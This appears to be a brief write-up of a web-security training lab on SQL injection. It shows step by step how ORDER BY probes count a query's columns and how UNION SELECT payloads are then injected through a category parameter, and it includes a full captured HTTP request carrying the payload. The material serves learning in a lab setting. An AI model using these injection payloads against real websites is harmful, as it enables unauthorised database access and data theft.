Title : SQL injection UNION attack, determining the number of columns returned by the query



```
https://vulnerable.site/product?category=Gifts'

```

```
step 2: Use ORDER BY to find the number of columns
```

```
' ORDER BY 1--       ✅ OK
' ORDER BY 2--       ✅ OK
' ORDER BY 3--       ✅ OK
```

```
Step 3: Use UNION SELECT with matching columns

```

```
' UNION SELECT NULL,NULL,NULL-- 

```
payload working
```
' UNION SELECT 'a','b','c'--
```
 
```
GET /filter?category=' UNION SELECT 'a','b','c'-- HTTP/2
Host: 0a79007003852eeb80264e05004c001e.web-security-academy.net
Cookie: session=yXcJwV3ECHB8ZTWopze2GmFgELyvbJWV
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a79007003852eeb80264e05004c001e.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers



```


`Congratulations, you solved the lab!`

![Screenshot](/home/kali/IMG_0639(2).PNG.jpg)